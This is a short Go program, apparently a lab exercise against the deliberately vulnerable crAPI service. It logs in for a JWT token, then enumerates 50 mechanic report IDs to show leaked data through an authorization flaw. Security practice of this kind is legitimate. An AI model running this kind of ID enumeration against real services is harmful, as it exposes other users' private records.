package main

import (
	"fmt"
	"log"
	"os"

	configurator "github.com/tomek-skrond/crapiconfigurator"
)

func main() {
	// read config
	pwd, _ := os.Getwd()
	config, err := configurator.GetConfig(pwd + "/config.json")
	if err != nil {
		log.Fatalln(err)
	}

	// get jwt token
	token := configurator.GetJWTToken(config.LoginURL, config.Email, config.Password)
	if token == "" {
		log.Fatalln("token empty")
	}

	// check N report IDs
	fmt.Println("Mechanic reports leaked data:")
	GetAllReportsByID(50, token, config.TargetURL)
}
